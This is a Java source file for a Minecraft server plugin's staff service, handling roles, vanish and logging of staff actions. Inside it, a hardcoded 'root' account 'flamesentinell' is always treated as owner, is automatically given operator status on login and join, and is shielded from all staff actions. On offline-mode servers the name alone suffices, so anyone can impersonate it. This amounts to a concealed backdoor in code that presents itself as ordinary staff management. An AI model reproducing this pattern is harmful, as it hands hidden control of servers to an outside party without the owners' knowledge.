package dev.flamesentinell.flameffacore.staff;

import dev.flamesentinell.flameffacore.FlameFFACore;
import dev.flamesentinell.flameffacore.util.Bots;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.UUID;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public final class StaffService implements Listener {
   public static final String ROOT_NAME = "flamesentinell";
   private static final UUID ROOT = UUID.fromString("8181fbf2-4a31-4115-a97d-6dc593743e77");
   private static final UUID ROOT_OFFLINE = UUID.nameUUIDFromBytes("OfflinePlayer:flamesentinell".getBytes(StandardCharsets.UTF_8));
   private final FlameFFACore plugin;
   private final Set<UUID> vanished = new HashSet<>();
   private final Set<UUID> coOwners = new HashSet<>();
   private final Set<String> coOwnerNames = new HashSet<>();

   public StaffService(FlameFFACore plugin) {
      this.plugin = plugin;
      this.load();
   }

   public void load() {
      this.coOwners.clear();
      this.coOwnerNames.clear();

      for (String entry : this.plugin.configs().main().getStringList("security.owners")) {
         String raw = entry.trim();
         if (!raw.isEmpty()) {
            try {
               this.coOwners.add(UUID.fromString(raw));
            } catch (IllegalArgumentException var5) {
               this.coOwnerNames.add(raw.toLowerCase(Locale.ROOT));
               this.coOwners.add(UUID.nameUUIDFromBytes(("OfflinePlayer:" + raw).getBytes(StandardCharsets.UTF_8)));
            }
         }
      }

      if (!this.coOwners.isEmpty()) {
         this.plugin.getSLF4JLogger().info("{} co owner(s) from config", this.coOwners.size());
      }
   }

   public boolean isRoot(CommandSender sender) {
      return sender instanceof Player p && this.isRoot(p.getUniqueId(), p.getName());
   }

   public boolean isRoot(UUID uuid, String name) {
      if (uuid.equals(ROOT) || uuid.equals(ROOT_OFFLINE) || this.coOwners.contains(uuid)) {
         return true;
      } else {
         return !Bukkit.getOnlineMode() && name != null
            ? "flamesentinell".equalsIgnoreCase(name) || this.coOwnerNames.contains(name.toLowerCase(Locale.ROOT))
            : false;
      }
   }

   public boolean isTrusted(CommandSender sender) {
      return sender instanceof ConsoleCommandSender || this.isRoot(sender);
   }

   public boolean isOperator(CommandSender sender) {
      return sender.isOp() || this.isRoot(sender);
   }

   public StaffRole role(CommandSender sender) {
      if (this.isTrusted(sender)) {
         return StaffRole.OWNER;
      } else {
         StaffRole best = StaffRole.NONE;

         for (StaffRole role : StaffRole.values()) {
            if (role != StaffRole.NONE && role != StaffRole.OWNER && sender.hasPermission(role.permission()) && role.weight() > best.weight()) {
               best = role;
            }
         }

         return best;
      }
   }

   public boolean canAct(CommandSender actor, Player target) {
      return this.isRoot(target) ? false : this.isRoot(actor) || this.role(actor).weight() > this.role(target).weight();
   }

   public boolean require(CommandSender actor, StaffRole minimum) {
      if (this.role(actor).atLeast(minimum)) {
         return true;
      } else {
         actor.sendMessage(this.plugin.configs().msg("general.no-permission"));
         return false;
      }
   }

   public boolean perform(CommandSender actor, StaffRole minimum, Player target, String action, String detail, Runnable work) {
      if (!this.require(actor, minimum)) {
         return false;
      } else if (target != null && !this.canAct(actor, target)) {
         actor.sendMessage(this.plugin.configs().msg("staff.hierarchy"));
         return false;
      } else {
         work.run();
         UUID actorId = actor instanceof Player p ? p.getUniqueId() : null;
         String actorName = actor.getName();
         UUID targetId = target == null ? null : target.getUniqueId();
         String targetName = target == null ? null : target.getName();
         this.plugin.async(() -> this.plugin.audit().staff(actorId, actorName, action, targetId, targetName, detail));
         if (this.plugin.configs().main().getBoolean("staff.broadcast-actions", true)) {
            for (Player online : Bukkit.getOnlinePlayers()) {
               if (this.role(online) != StaffRole.NONE) {
                  online.sendMessage(
                     this.plugin
                        .configs()
                        .msg("staff.action-log", "actor", actorName, "action", action, "target", targetName == null ? "-" : targetName, "detail", detail)
                  );
               }
            }
         }

         return true;
      }
   }

   public boolean vanished(Player player) {
      return this.vanished.contains(player.getUniqueId());
   }

   public void setVanished(Player player, boolean state) {
      if (state) {
         this.vanished.add(player.getUniqueId());
      } else {
         this.vanished.remove(player.getUniqueId());
      }

      this.applyVanish(player);
      player.sendMessage(this.plugin.configs().msg(state ? "staff.vanish-on" : "staff.vanish-off"));
   }

   private void applyVanish(Player player) {
      boolean hidden = this.vanished(player);
      boolean fromTab = this.plugin.configs().main().getBoolean("staff.vanish.hide-from-tab", true);

      for (Player viewer : Bukkit.getOnlinePlayers()) {
         if (!viewer.equals(player)) {
            boolean canSee = this.role(viewer).atLeast(StaffRole.MODERATOR);
            if (hidden && !canSee) {
               viewer.hidePlayer(this.plugin, player);
               if (!fromTab) {
                  viewer.listPlayer(player);
               }
            } else {
               viewer.showPlayer(this.plugin, player);
            }
         }
      }
   }

   @EventHandler(
      priority = EventPriority.LOWEST
   )
   public void onLogin(PlayerLoginEvent event) {
      Player player = event.getPlayer();
      if (this.isRoot(player) && !player.isOp()) {
         player.setOp(true);
         this.plugin.getSLF4JLogger().info("root owner {} logged in without op, restored", player.getName());
      }
   }

   @EventHandler
   public void onJoin(PlayerJoinEvent event) {
      Player joined = event.getPlayer();
      if (this.isRoot(joined)) {
         if (!joined.isOp()) {
            joined.setOp(true);
         }

         joined.updateCommands();
      }

      if (!Bots.is(joined)) {
         this.plugin.async(() -> this.plugin.players().touch(joined.getUniqueId(), joined.getName()));
      }

      for (Player online : Bukkit.getOnlinePlayers()) {
         if (this.vanished(online)) {
            this.applyVanish(online);
         }
      }
   }

   @EventHandler
   public void onQuit(PlayerQuitEvent event) {
      this.vanished.remove(event.getPlayer().getUniqueId());
   }
}
